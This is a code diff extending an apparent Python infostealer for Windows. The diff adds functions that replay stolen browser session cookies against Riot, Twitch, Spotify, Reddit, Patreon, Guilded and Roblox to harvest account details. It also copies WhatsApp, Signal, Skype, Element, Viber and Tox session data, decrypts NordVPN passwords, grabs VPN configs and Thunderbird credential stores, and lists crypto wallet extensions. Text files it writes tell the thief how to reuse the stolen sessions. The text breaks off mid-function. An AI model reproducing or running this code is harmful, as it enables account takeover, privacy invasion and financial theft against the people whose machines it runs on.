@@ -6,6 +6,8 @@ import base64
 import re
 import sys
 import time
+import winreg
+import win32con # type: ignore
 import aiohttp # type: ignore
 import os
 import shutil
@@ -16,7 +18,11 @@ import psutil # type: ignore
 import win32api # type: ignore
 
 from pathlib import Path
+import xml.etree.ElementTree as ET
 from ctypes import *
+import winreg as reg
+from urllib.request import urlopen
+from json import loads
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes # type: ignore
 from cryptography.hazmat.backends import default_backend # type: ignore
 
@@ -51,14 +57,26 @@ class ListFonction:
     TasksList = list()
     SystemInfo = list()
 
+    DiscordAccounts = list()
+    RobloxAccounts = list()
     TikTokAccounts = list()
     TwitterAccounts = list()
     InstagramAccounts = list()
+    RiotUserAccounts = list()
     SteamUserAccounts = list()
+    RedditAccounts = list()
+    TwitchAccounts = list()
+    SpotifyAccount = list()
+    GuildedAccounts = list()
+    PatreonAccounts = list()
 
     PasswordManager = list()
     WalletsCounts = list()
+    VpnsCounts = list()
+    Messengers = list()
+    MailsCounts = list()
     GamesCounts = list()
+    FtpClient = list()
 
 class WindowsApi:
     @staticmethod
@@ -286,6 +304,18 @@ class get_data:
                     if ".instagram.com" in cookie[0].lower() and "sessionid" in cookie[1].lower():asyncio.create_task(self.StealInstagram(dec_cookie, BrowserName))
                     if ".tiktok.com" in cookie[0].lower() and cookie[1] == "sessionid":asyncio.create_task(self.StealTikTok(dec_cookie, BrowserName))
                     if ".x.com" in cookie[0].lower() and cookie[1] == "auth_token":asyncio.create_task(self.StealTwitter(dec_cookie, BrowserName))
+                    if "roblox" in str(cookie[0]).lower() and "ROBLOSECURITY" in str(cookie[1]):asyncio.create_task(self.StealRoblox(dec_cookie, BrowserName)) 
+                    if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():asyncio.create_task(self.StealReddit(dec_cookie, BrowserName))
+                    if ".guilded.gg" in str(cookie[0]).lower() and "hmac_signed_session" in str(cookie[1]).lower():asyncio.create_task(self.StealGuilded(dec_cookie, BrowserName))
+                    if ".patreon.com" in str(cookie[0]).lower() and "session_id" in str(cookie[1]).lower():asyncio.create_task(self.StealPatreon(dec_cookie, BrowserName))
+                    if ".spotify.com" in str(cookie[0]).lower() and "sp_dc" in str(cookie[1]).lower():asyncio.create_task(self.StealSpotify(dec_cookie, BrowserName))
+                    if ".twitch.tv" in str(cookie[0]).lower() and "auth-token" in str(cookie[1]).lower():twitch_cookie = dec_cookie
+                    if ".twitch.tv" in str(cookie[0]).lower() and str(cookie[1]).lower() == "login":twitch_username = dec_cookie
+                    if not twitch_username == None and not twitch_cookie == None:
+                        asyncio.create_task(self.StealTwitch(twitch_cookie, twitch_username, BrowserName))
+                        twitch_username = None
+                        twitch_cookie = None
+                    if "account.riotgames.com" in str(cookie[0]).lower() and "sid" in str(cookie[1]).lower():asyncio.create_task(self.StealRiotUser(dec_cookie, BrowserName))
 
         except Exception as e:
             error_handler(f"get cookies error - {str(e)}")
@@ -310,6 +340,200 @@ class get_data:
                 except:pass  
         except Exception as e:
             error_handler(f"get autofills error - {str(e)}")
+
+    async def StealRiotUser(self, cookie, browser: str) -> None:
+        try:
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                async with session.get('https://account.riotgames.com/api/account/v1/user', headers={"Cookie": f"sid={cookie}"}) as req:
+                    response = await req.json()
+
+            username = str(response.get("username", "No Username"))
+            email = str(response.get("email", "No Email"))
+            region = str(response.get("region", "No Region"))
+            locale = str(response.get("locale", "No Locale"))
+            country = str(response.get("country", "No Country"))
+            mfa = str(response.get("mfa", {}).get("verified", "No MFA Info"))
+
+        except Exception as e:
+            error_handler(f"riot user error - {str(e)}")
+        else:
+            ListFonction.RiotGames.append(f"Username: {username}\nEmail: {email}\nRegion: {region}\nLocale: {locale}\nCountry: {country}\nMFA Verified: {mfa}\nBrowser: {browser}\nCookie: {cookie}")
+
+    async def StealTwitch(self, auth_token, username, browser:str) -> None:
+        try:
+            url = 'https://gql.twitch.tv/gql'
+            headers = {
+                'Authorization': f'OAuth {auth_token}',
+            }
+
+            query = f"""
+            query {{
+                user(login: "{username}") {{
+                    id
+                    login
+                    displayName
+                    email
+                    hasPrime
+                    isPartner
+                    language
+                    profileImageURL(width: 300)
+                    bitsBalance
+                    followers {{
+                        totalCount
+                    }}
+                }}
+            }}"""
+
+            data = {
+                "query": query
+            }
+
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                async with session.post(url, headers=headers, json=data) as response:
+                    if response.status == 200:
+                        data = await response.json()
+
+            idd = data["data"]["user"]["id"]
+            login = data["data"]["user"]["login"]
+            acc_url = f"https://www.twitch.tv/{login}"
+            displayName = data["data"]["user"]["displayName"]
+            email = data["data"]["user"]["email"]
+            hasPrime = data["data"]["user"]["hasPrime"]
+            isPartner = data["data"]["user"]["isPartner"]
+            lang = data["data"]["user"]["language"]
+            bits = data["data"]["user"]["bitsBalance"]
+            followers = data["data"]["user"]["followers"]["totalCount"]            
+
+        except Exception as e:
+            error_handler(f"twitch session error - {str(e)}")
+        else:
+            ListFonction.TwitchAccounts.append(f"ID: {idd}\nLogin: {login}\nDisplay Name: {displayName}\nEmail: {email}\nHas Prime: {hasPrime}\nIs Partner: {isPartner}\nLanguage: {lang}\nBits Balance: {bits}\nFollowers: {followers}\nProfile URL: {acc_url}\nBrowser: {browser}\nAuth Token: {auth_token}")
+
+    async def StealSpotify(self, cookie, browser: str) -> None:
+        try:
+            url = 'https://www.spotify.com/api/account-settings/v1/profile'
+            url2 = 'https://www.spotify.com/eg-en/api/account/v1/datalayer/'
+
+            headers = {
+                'cookie': f'sp_dc={cookie}',
+                'Accept': 'application/json'
+            }
+
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                async with session.get(url, headers=headers) as response:
+                    if response.status == 200:
+                        data = await response.json()
+                    else:
+                        pass
+
+                async with session.get(url2, headers=headers) as response:
+                    if response.status == 200:
+                        data2 = await response.json()
+                    else:
+                        pass
+
+            email = data["profile"]["email"]
+            gender = data["profile"]["gender"]
+            birthdate = data["profile"]["birthdate"]
+            country = data["profile"]["country"]
+            third = data["profile"]["third_party_email"]
+            username = data["profile"]["username"]
+            istrial = data2["isTrialUser"]
+            plan = data2["currentPlan"]
+            isrecurring = data2["isRecurring"]
+            daysleft = data2["daysLeft"]
+            sub = data2["isSubAccount"]
+            billing = data2["nextBillingInfo"]
+            expiry = data2["expiry"]
+
+            ListFonction.SpotifyAccount.append(f"Browser: {browser}\nEmail: {email}\nGender: {gender}\nBirthdate: {birthdate}\nCountry: {country}\nThird Party Email: {third}\nUsername: {username}\nIsTrial: {istrial}\nCurrentPlan: {plan}\nIsRecurring: {isrecurring}\nDaysLeft: {daysleft}\nIsSub: {sub}\nBilling Info: {billing}\nExpiry: {expiry}\n==============================================\n")
+
+        except Exception as e:
+            error_handler(f"spotify session error - {str(e)}")
+
+
+    async def StealReddit(self, cookie, browser: str) -> None:
+        try:
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                async with session.post('https://accounts.reddit.com/api/access_token', headers={"cookie": f"reddit_session={cookie}", "Authorization": "Basic b2hYcG9xclpZdWIxa2c6"}, json={"scopes": ["*", "email", "pii"]}) as res:
+                    response = await res.json()
+                    accessToken = response["access_token"]
+                async with session.get('https://oauth.reddit.com/api/v1/me', headers={'User-Agent': 'android:com.example.myredditapp:v1.2.3', "Authorization": "Bearer " + accessToken}) as req:
+                    data2 = await req.json()
+
+                gmail = data2.get("email", "No email") if data2.get("email") else "No email"
+                username = data2.get("name", "No username")
+                profileUrl = f'https://www.reddit.com/user/{username}'
+                commentKarma = data2.get("comment_karma", "No comment karma")
+                totalKarma = data2.get("total_karma", "No total karma")
+                coins = data2.get("coins", "No coins")
+                mod = data2.get("is_mod", "No mod status")
+                gold = data2.get("is_gold", "No gold status")
+                suspended = data2.get("is_suspended", "No suspension status")
+
+        except Exception as e:
+            error_handler(f"reddit session error - {str(e)}")
+        else:
+            ListFonction.RedditAccounts.append(f"Username: {username}\nEmail: {gmail}\nProfile URL: {profileUrl}\nComment Karma: {commentKarma}\nTotal Karma: {totalKarma}\nCoins: {coins}\nMod Status: {mod}\nGold Status: {gold}\nSuspended: {suspended}\nBrowser: {browser}\nCookie: {cookie}")
+
+
+    async def StealPatreon(self, cookie, browser: str) -> None:
+        try:
+            patreonurl = "https://www.patreon.com/api/current_user?include=connected_socials%2Ccampaign.connected_socials&json-api-version=1.0"
+            headers = {
+                "Cookie": f'session_id={cookie}',
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+            }
+
+            async with aiohttp.ClientSession(headers=headers, connector=aiohttp.TCPConnector(ssl=True)) as session:
+                async with session.get(patreonurl) as response:
+                    data = await response.json()
+
+            req = data["data"]["attributes"].get
+            social_connections = data.get("data", {}).get("attributes", {}).get("social_connections", {})
+            created = req("created", "Couldn't get creation date")
+            email = req("email", "Couldn't get email")
+            verified = '✅' if req("is_email_verified", False) else '❌'
+            currency = req("patron_currency", "Couldn't get currency")
+            bio = req("about", "Couldn't get bio/No bio")
+            non_null_social_connections = [key for key, value in social_connections.items() if value is not None]
+            url = data["links"].get("self", "Couldn't get URL")
+            url2 = req("url", "Couldn't get URL")
+            social_connection_names = "\n".join([f"{key.capitalize()}" for key in non_null_social_connections]) if non_null_social_connections else "No connections"
+
+        except Exception as e: 
+            error_handler(f"patreon session error - {str(e)}")
+        else:
+            ListFonction.PatreonAccounts.append(f"Email: {email}\nVerified: {verified}\nCreated: {created}\nCurrency: {currency}\nBio: {bio}\nSocial Connections:\n{social_connection_names}\nProfile URL: {url}\nAdditional URL: {url2}\nBrowser: {browser}\nCookie: {cookie}")
+
+    async def StealGuilded(self, cookie, browser: str) -> None:
+        try:
+            urlguild = "https://www.guilded.gg/api/me"
+            headersguild = {
+                "Cookie": f"hmac_signed_session={cookie}",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+            }
+
+            async with aiohttp.ClientSession(headers=headersguild, connector=aiohttp.TCPConnector(ssl=True)) as session:
+                async with session.get(urlguild) as response:
+                    data = await response.json()
+
+            social_links_info = [{"Name": link.get('handle', ''), "Website": link.get('type', 'Cannot get the website'), "URL": link.get('additionalInfo', {}).get('profileUrl', 'No Website')} for link in data["user"].get('socialLinks', [])] or 'No Connections'
+
+            formatted_social_links = "\n".join([f"📙 {link['Name']}\n🌐 {link['Website']}\n`🔗 {link['URL']}`" for link in social_links_info]) if social_links_info != 'No Connections' else 'No Connections'
+
+            email = data["user"].get("email", 'No Email')
+            ids = data["user"].get("id", 'Error getting ID')
+            globalusername = data["user"].get("name", 'No global username')
+            username = data["user"].get("subdomain", 'No Subdomain (Private Username)')
+            join = data["user"].get("joinDate", "Couldn't get join date")
+            bio = data["user"]["aboutInfo"].get("tagLine", "Couldn't get user bio")
+
+        except Exception as e:
+            error_handler(f"guilded session error - {str(e)}")
+        else:
+            ListFonction.GuildedAccounts.append(f"Username: {username}\nGlobal Username: {globalusername}\nEmail: {email}\nUser ID: {ids}\nJoin Date: {join}\nBio: {bio}\nSocial Links:\n{formatted_social_links}\nBrowser: {browser}\nCookie: {cookie}")
+
 
     async def StealInstagram(self, cookie: str, browser: str) -> None:
         try:
@@ -409,27 +633,125 @@ class get_data:
             error_handler(f"twitter session error - {str(e)}")
         else:
             ListFonction.TwitterAccounts.append(f"Username: {username}\nScreen Name: {nickname}\nFollowers: {followers_count}\nFollowing: {following_count}\nTweets: {tweets_count}\nIs Verified: {'Yes' if verified else 'No'}\nCreated At: {created_at}\nBiography: {description}\nProfile URL: {profileURL}\nCookie: {cookie}\nBrowser: {browser}")
+    async def StealRoblox(self, cookie, browser) -> None:
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get("https://www.roblox.com/mobileapi/userinfo", cookies = {".ROBLOSECURITY": cookie}) as response:
+                    baseinf = await response.json()
+            username, userId,robux,thumbnail, premium, builderclub = baseinf["UserName"], baseinf["UserID"], baseinf["RobuxBalance"],baseinf["ThumbnailUrl"], baseinf["IsPremium"],baseinf["IsAnyBuildersClubMember"]
 
+            async def GetAll(UserID: int) -> list:
+                try:
+                    FullList = []
+                    async with aiohttp.ClientSession() as session:
+                        async with session.get(f'https://friends.roblox.com/v1/users/{UserID}/friends') as response:
+                            response_text = await response.text()
+                            Friendslist = json.loads(response_text)
+
+                    if 'data' in Friendslist:
+                        x = 0
+                        for friend in Friendslist['data']:
+                            if x == 3:
+                                return FullList
+                            
+                            is_banned = friend.get('isBanned', False)
+                            has_verified_badge = friend.get('hasVerifiedBadge', False)
+
+                            banned_status = "❌" if not is_banned else "✅"
+                            verified_status = "❌" if not has_verified_badge else "✅"
+
+                            FullList.append((friend.get('displayName', ''), friend.get('name', ''), banned_status, verified_status))
+                            x += 1
+                        return FullList
+                    else:
+                        raise ValueError("No 'data' key in the response.")
+                except Exception as e:
+                    error_handler(f"get all roblox error - {str(e)}")
+                    return []
+
+            async def GetRAP(UserID):
+                ErroredRAP = 0
+                TotalValue = 0
+                Cursor = ""
+                Done = False
+                while not Done:
+                    try:
+                        async with aiohttp.ClientSession() as session:
+                            async with session.get(f"https://inventory.roblox.com/v1/users/{UserID}/assets/collectibles?sortOrder=Asc&limit=100&cursor={Cursor}") as response:
+                                data = await response.json()
+                                
+                        if data.get('nextPageCursor') is None:
+                            Done = True
+                        else:
+                            Cursor = data['nextPageCursor']
+
+                        for Item in data.get("data", []):
+                            try:
+                                RAP = int(Item.get('recentAveragePrice', 0))
+                                TotalValue += RAP
+                            except Exception as e:
+                                ErroredRAP += 1
+                        
+                        if not data.get('nextPageCursor'):
+                            Done = True
+                                    
+                    except Exception as e:
+                        error_handler(f"get roblox rap error - {str(e)}")
+                        Done = True
+                return TotalValue
+
+            friendlist = await GetAll(userId)
+            rap = await GetRAP(userId)
+            
+            if premium == True:
+                premium = '✅'
+            else:
+                premium = '❌'
+            if builderclub == True:
+                builderclub = '✅'
+            else:
+                premium = '❌'
+
+            async with aiohttp.ClientSession() as session:
+                async with session.get(f"https://users.roblox.com/v1/users/{userId}") as response:
+                    advancedInfo = await response.json()
+            description = 'No Description'
+            if advancedInfo["description"]:
+                description = advancedInfo["description"]
+            if advancedInfo["description"] == True:
+                banned = '✅'
+            else: 
+                banned = '❌'
+            creationDate = advancedInfo["created"]
+            creationDate = creationDate.split("T")[0].split("-")
+            creationDate = f"{creationDate[1]}/{creationDate[2]}/{creationDate[0]}"
+            creation_timestamp = time.mktime(time.strptime(creationDate, "%m/%d/%Y"))
+            current_timestamp = time.time()
+            seconds_passed = current_timestamp - creation_timestamp
+            days_passed = round(seconds_passed / (24 * 60 * 60))
+
+        except Exception as e:
+            error_handler(f"roblox session error - {str(e)}")
+        else:
+            ListFonction.RobloxAccounts.append(f"Cookie: {cookie}\nBrowser: {browser}\nUser: {username} ({userId})\nThumbail: {thumbnail}\nRobux: {robux}\nPremium: {premium}\nCreation Date: {creationDate} / {days_passed} Days!\nDescription: {description}\nBanned: {banned}\nRAP: {rap}\nFriends List: \n{friendlist}\n==============================================\n")
+            
     async def StealWallets(self, copied_path:str) -> None:
         try:
             wallets_ext_names = {
-                "Binance (Chrome)": "fhbohimaelbohpjbbldcngcnapndodjp",
-                "Binance (Edge)": "eeagobfjdenkkddmbclomhiblgggliao",
+                "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
                 "Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
                 "Authy": "gaedmjdfmmahhbjefcbgaolhhanlaolb",
                 "EOSAuthenticator": "oeljdldpnmdbchonielidgobddffflal",
                 "GAuthAuthenticator": "ilgcnhelpchnceeipipijaljkblbcobl",
                 "TON": "nphplpgoakhhjchkkhmiggakijnkhfnd",
-                "Ronin (Chrome)": "fnjhmkhhmkbjkkabndcnnogagogbneec",
-                "Coinbase (Chrome)": "hnfanknocfeofbddgcijnmhnfnkdnaad",
-                "Coinbase (Edge)": "jbdaocneiiinmjbjlgalhcelgbejmnid",
-                "MetaMask (Chrome)": "nkbihfbeogaeaoehlefnkodbefgpgknn",
-                "MetaMask (Edge)": "ejbalbakoplchlghecdalmeeeajnimhm",
-                "Metamask (Opera)": "djclckkglechooblngghdinmeemkbgci",
+                "Ronin": "fnjhmkhhmkbjkkabndcnnogagogbneec",
+                "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
+                "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
+                "MetaMask_Edge": "ejbalbakoplchlghecdalmeeeajnimhm",
                 "Exodus": "aholpfdialjgjfhomihkjbmgjidlcdno",
-                "TrustWallet (Chrome)": "egjidjbpglichdcondbcbdnbeeppgdph",
-                "TrustWallet (Edge)": "fdjamakpfbbddfjaooikfcpapjohcfmg",
-                "Ronin (Edge)": "bblmcdckkhkhfhhpfcchlpalebmonecp",
+                "TrustWallet": "egjidjbpglichdcondbcbdnbeeppgdph",
+                "Metamask (Opera)": "djclckkglechooblngghdinmeemkbgci",
+                "Ronin": "bblmcdckkhkhfhhpfcchlpalebmonecp",
                 }
             wallet_local_paths = {
                 "Bitcoin": os.path.join(self.appdata, "Bitcoin", "wallets"),
@@ -502,6 +824,574 @@ class get_data:
             error_handler(f"telegram error - {str(e)}")
             pass
 
+
+    async def StealWhatsApp(self, directory_path: str) -> None:
+        try:
+            whatsapp_session = os.path.join(directory_path, "Messenger", "WhatsApp")
+            os.makedirs(whatsapp_session, exist_ok=True)
+            regex_pattern = re.compile(r"^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$", re.IGNORECASE)
+            parent_folders = [entry for entry in Path(self.localappdata, 'Packages').iterdir() if regex_pattern.match(entry.name)]
+
+            for parent in parent_folders:
+                local_state_folders = [entry for entry in parent.rglob("LocalState") if entry.is_dir()]
+                for local_state_folder in local_state_folders:
+                    profile_pictures_folders = [entry for entry in local_state_folder.rglob("profilePictures") if entry.is_dir()]
+                    for profile_folder in profile_pictures_folders:
+                        destination_path = os.path.join(whatsapp_session, local_state_folder.name, "profilePictures")
+                        os.makedirs(destination_path, exist_ok=True)
+                        shutil.copytree(profile_folder, destination_path, dirs_exist_ok=True)
+
+                    files_to_copy = [file for file in local_state_folder.rglob("*") if file.is_file() and file.stat().st_size <= 10 * 1024 * 1024 and re.search(r"\.db$|\.db-wal$|\.dat$", file.name)]
+                    for file in files_to_copy:
+                        dest_folder = os.path.join(whatsapp_session, local_state_folder.name)
+                        os.makedirs(dest_folder, exist_ok=True)
+                        shutil.copy(file, dest_folder)
+                        
+        except Exception as e:
+            error_handler(f"whatsapp error - {str(e)}")
+            pass
+
+    async def StealSkype(self, directory_path: str) -> None:
+        try:
+            skype_folder = os.path.join(self.appdata, "Microsoft", "Skype for Desktop", "Local Storage", "leveldb")
+            if os.path.exists(skype_folder):
+                copy_path = os.path.join(directory_path, "Messenger", "Skype")
+                os.makedirs(copy_path, exist_ok=True)
+                if os.path.isdir(skype_folder):shutil.copytree(skype_folder, copy_path, dirs_exist_ok=True)
+                else:shutil.copyfile(skype_folder, copy_path)
+                
+                if len(os.listdir(copy_path)) == 0:
+                    os.rmdir(copy_path)
+                
+        except Exception as e:
+            error_handler(f"skype error - {str(e)}")
+            pass
+
+    async def StealSignal(self, directory_path: str) -> None:
+        try:
+            signal_path = os.path.join(self.appdata, 'Signal')
+            copied_path = os.path.join(directory_path, "Messenger", "Signal")
+            if os.path.isdir(signal_path):
+                if not os.path.exists(copied_path):
+                    os.mkdir(copied_path)
+                try:
+                    if os.path.exists(Path(signal_path) / "sql"):
+                        shutil.copytree(Path(signal_path) / "sql", os.path.join(copied_path, "sql"))
+                    if os.path.exists(Path(signal_path) / "attachments.noindex"):
+                        shutil.copytree(Path(signal_path) / "attachments.noindex", os.path.join(copied_path, "attachments.noindex"))
+                    if os.path.exists(Path(signal_path) / "config.json"):
+                        shutil.copy(Path(signal_path) / "config.json", copied_path)
+                except Exception as e:
+                    error_handler(f"copy signal files error - {str(e)}")
+                    pass
+                if len(os.listdir(copied_path)) == 0:
+                    os.rmdir(copied_path)
+
+        except Exception as e:
+            error_handler(f"signal error - {str(e)}")
+            pass
+ 
+    async def StealElement(self, directory_path: str) -> None:
+        try:
+            found_element = False
+            element_path = os.path.join(self.appdata, 'Element')
+            copied_path = os.path.join(directory_path, "Messenger", "Element")
+            if os.path.isdir(element_path):
+                if not os.path.exists(copied_path):
+                    os.mkdir(copied_path)
+                indexed_db_src = Path(element_path) / "IndexedDB"
+                local_storage_src = Path(element_path) / "Local Storage"
+                try:
+                    if os.path.exists(indexed_db_src):
+                        shutil.copytree(indexed_db_src, os.path.join(copied_path, "IndexedDB"))
+                    if os.path.exists(local_storage_src):
+                        shutil.copytree(local_storage_src, os.path.join(copied_path, "Local Storage"))
+                    found_element = True
+                except Exception as e:
+                    error_handler(f"copy element files error - {str(e)}")
+                    pass
+                if found_element:
+                    os.mkdir(os.path.join(copied_path, "How to Use"))
+                    with open(os.path.join(copied_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
+                        write_file.write("First, open this file path on your computer <%appdata%\\Element>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run Element")
+                if len(os.listdir(copied_path)) == 0:
+                    os.rmdir(copied_path)
+        except Exception as e:
+            error_handler(f"element error - {str(e)}")
+            pass 
+   
+    async def StealViber(self, directory_path: str) -> None:
+        try:
+            found_viber = False
+            viber_path = os.path.join(self.appdata, 'ViberPC')
+            copied_path = os.path.join(directory_path, "Messenger", "Viber")
+            if os.path.isdir(viber_path):
+                if not os.path.exists(copied_path):
+                    os.mkdir(copied_path)
+                pattern = re.compile(r"^(\+?[0-9]{1,12})$")
+                directories = [entry for entry in Path(viber_path).iterdir() if entry.is_dir() and pattern.match(entry.name)]
+                root_files = [file for file in Path(viber_path).glob("*.db")]
+
+                for root_file in root_files:
+                    shutil.copy(root_file, copied_path)
+
+                for directory in directories:
+                    destination_path = os.path.join(copied_path, directory.name)
+                    shutil.copytree(directory, destination_path)
+                    files = [file for file in directory.rglob("*") if file.is_file() and re.search(r"\.db$|\.db-wal$", file.name)]
+                    for file in files:
+                        dest_file_path = os.path.join(destination_path, file.name)
+                        shutil.copy(file, dest_file_path)
+                    found_viber = True
+                if found_viber:
+                    os.mkdir(os.path.join(copied_path, "How to Use"))
+                    with open(os.path.join(copied_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
+                        write_file.write("First, open this file path on your computer <%appdata%\\ViberPC>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run Viber")
+                if len(os.listdir(copied_path)) == 0:
+                    os.rmdir(copied_path)
+        except Exception as e:
+            error_handler(f"viber error - {str(e)}")
+            pass
+  
+
+    async def StealPidgin(self, directory_path: str) -> None:
+        try:
+            pidgin_folder = os.path.join(self.appdata, '.purple', "accounts.xml")
+            if os.path.exists(pidgin_folder):
+                pidgin_accounts = os.path.join(directory_path, "Messenger", "Pidgin")
+                os.makedirs(pidgin_accounts, exist_ok=True)
+                if pidgin_folder.is_dir():
+                    shutil.copytree(pidgin_folder, pidgin_accounts, dirs_exist_ok=True)
+                else:
+                    shutil.copy2(pidgin_folder, pidgin_accounts)
+                if len(os.listdir(pidgin_accounts)) == 0:
+                    os.rmdir(pidgin_accounts)
+        except Exception as e:
+            error_handler(f"pidgin error - {str(e)}")
+            pass
+
+    async def StealTox(self, directory_path: str) -> None:
+        try:
+            tox_folder = os.path.join(self.appdata, 'Tox')
+            if os.path.isdir(tox_folder):
+                tox_session = os.path.join(directory_path, "Messenger", "Tox")
+                os.makedirs(tox_session, exist_ok=True)
+                for item in Path(tox_folder).iterdir():
+                    if item.is_dir():
+                        shutil.copytree(item, tox_session, dirs_exist_ok=True)
+                    else:
+                        shutil.copy2(item, tox_session)
+                if len(os.listdir(tox_session)) == 0:
+                    os.rmdir(tox_session)
+        except Exception as e:
+            error_handler(f"tox error - {str(e)}")
+            pass
+
+    async def StealProtonVPN(self, directory_path: str) -> None:
+        try:
+            protonvpn_folder = os.path.join(self.localappdata, 'ProtonVPN')
+            if not os.path.isdir(protonvpn_folder):
+                return
+            
+            async def get_hierarchy(root_dir, pattern):
+                return [entry for entry in root_dir.iterdir() if entry.is_dir() and re.match(pattern, entry.name)]
+            protonvpn_account = os.path.join(directory_path, "VPN", 'ProtonVPN')
+            os.makedirs(protonvpn_account, exist_ok=True)
+            pattern = re.compile(r"^ProtonVPN_Url_[A-Za-z0-9]+$")
+            directories = await get_hierarchy(Path(protonvpn_folder), pattern)
+            for directory in directories:
+                destination_path = os.path.join(protonvpn_account, directory.name)
+                if directory.is_dir():
+                    shutil.copytree(directory, destination_path, dirs_exist_ok=True)
+                else:
+                    shutil.copy2(directory, destination_path)
+        except Exception as e:
+            error_handler(f"proton error - {str(e)}")
+            pass
+
+    async def StealSurfsharkVPN(self, directory_path: str) -> None:
+        try:
+            surfsharkvpn_folder = os.path.join(self.appdata, 'Surfshark')
+            if not os.path.isdir(surfsharkvpn_folder):
+                return
+            
+            surfsharkvpn_account = os.path.join(directory_path, "VPN", 'Surfshark')
+            os.makedirs(surfsharkvpn_account, exist_ok=True)
+            files_to_copy = ["data.dat", "settings.dat", "settings-log.dat", "private_settings.dat"]
+            for root, _, files in os.walk(surfsharkvpn_folder):
+                for file in files:
+                    if file in files_to_copy:
+                        shutil.copy2(os.path.join(root, file), surfsharkvpn_account)
+        except Exception as e:
+            error_handler(f"surfshark error - {str(e)}")
+            pass
+
+    async def StealOpenVPN(self, directory_path: str) -> None:
+        try:
+            openvpn_folder = os.path.join(self.appdata, 'OpenVPN Connect')
+            if not os.path.isdir(openvpn_folder):
+                return
+            
+            openvpn_accounts = os.path.join(directory_path, "VPN", 'OpenVPN')
+            os.makedirs(openvpn_accounts, exist_ok=True)
+            profiles_src = os.path.join(openvpn_folder, 'profiles')
+            config_src = os.path.join(openvpn_folder, 'config.json')
+
+            if Path(profiles_src).is_dir():
+                shutil.copytree(Path(profiles_src), openvpn_accounts, dirs_exist_ok=True)
+            else:
+                shutil.copy2(Path(profiles_src), openvpn_accounts)
+
+            if Path(config_src).is_dir():
+                shutil.copytree(Path(config_src), openvpn_accounts, dirs_exist_ok=True)
+            else:
+                shutil.copy2(Path(config_src), openvpn_accounts)
+        except Exception as e:
+            error_handler(f"openvpn error - {str(e)}")
+            pass
+
+    async def DecryptNordVPN(self, encrypted) -> None:
+        try:
+            encrypted_data = base64.b64decode(encrypted)
+            return WindowsApi.CryptUnprotectData(encrypted_data).decode('utf-8')
+        except Exception as e:
+            error_handler(f"decrypt nordvpn error - {str(e)}")
+            return ""
+
+    async def StealNordVPN(self, driectory_path):
+        vpn_path = os.path.join(self.appdata, "NordVPN")
+
+        if not os.path.exists(vpn_path):
+            return
+
+        try:
+
+            for root, dirs, files in os.walk(vpn_path):
+                for directory in dirs:
+                    user_config_path = os.path.join(root, directory, "user.config")
+                    if not os.path.exists(user_config_path):
+                        continue
+
+                    vpn_version_path = os.path.join(driectory_path, "VPN", "NordVPN", directory)
+                    os.makedirs(vpn_version_path, exist_ok=True)
+
+                    tree = ET.parse(user_config_path)
+                    root_xml = tree.getroot()
+
+                    encoded_username = root_xml.find(".//setting[@name='Username']/value").text
+                    encoded_password = root_xml.find(".//setting[@name='Password']/value").text
+
+                    if not encoded_username or not encoded_password:
+                        continue
+
+                    username = await self.DecryptNordVPN(encoded_username)
+                    password = await self.DecryptNordVPN(encoded_password)
+
+                    with open(os.path.join(vpn_version_path, "nordvpn_account.txt"), "a") as file:
+                        file.write(f"Username: {username}\nPassword: {password}\n\n")
+        except Exception as e:
+            error_handler(f"nordvpn error - {str(e)}")
+            pass
+
+    async def BackupThunderbird(self, directory_path: str) -> None:
+        try:
+            thunderbird_folder = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Thunderbird', 'Profiles')
+            if not os.path.isdir(thunderbird_folder):
+                return
+            
+            thunderbird_backup = os.path.join(directory_path, "Email", 'Thunderbird')
+            os.makedirs(thunderbird_backup, exist_ok=True)
+            pattern = re.compile(r"^[a-z0-9]+\.default-esr$")
+            async def get_hierarchy(root_dir, pattern):
+                return [entry for entry in root_dir.iterdir() if entry.is_dir() and re.match(pattern, entry.name)]
+            directories = await get_hierarchy(Path(thunderbird_folder), pattern)
+            filter_files = ["key4.db", "key3.db", "logins.json", "cert9.db", "*.js"]
+            for directory in directories:
+                destination_path = os.path.join(thunderbird_backup, directory.name)
+                os.makedirs(destination_path, exist_ok=True)
+                for file_pattern in filter_files:
+                    for file in directory.rglob(file_pattern):
+                        relative_path = file.relative_to(directory)
+                        dest_file_path = os.path.join(destination_path, relative_path)
+                        dest_file_dir = os.path.dirname(dest_file_path)
+                        if not os.path.isdir(dest_file_dir):
+                            os.makedirs(dest_file_dir, exist_ok=True)
+            
+                        if file.is_dir():
+                            shutil.copytree(file, dest_file_path, dirs_exist_ok=True)
+                        else:
+                            shutil.copy2(file, dest_file_path)
+        except Exception as e:
+            error_handler(f"backupthunderbird error - {str(e)}")
+            pass
+
+
+    async def BackupMailbird(self, directory_path: str) -> None:
+        try:
+            mailbird_folder = os.path.join(self.localappdata, 'MailBird')
+            if not os.path.isdir(mailbird_folder):
+                return
+            
+            mailbird_db = os.path.join(directory_path, "Email", 'MailBird')
+            os.makedirs(mailbird_db, exist_ok=True)
+            store_db = os.path.join(mailbird_folder, 'Store', 'Store.db')
+            if Path(store_db).is_dir():
+                shutil.copytree(Path(store_db), mailbird_db, dirs_exist_ok=True)
+            else:
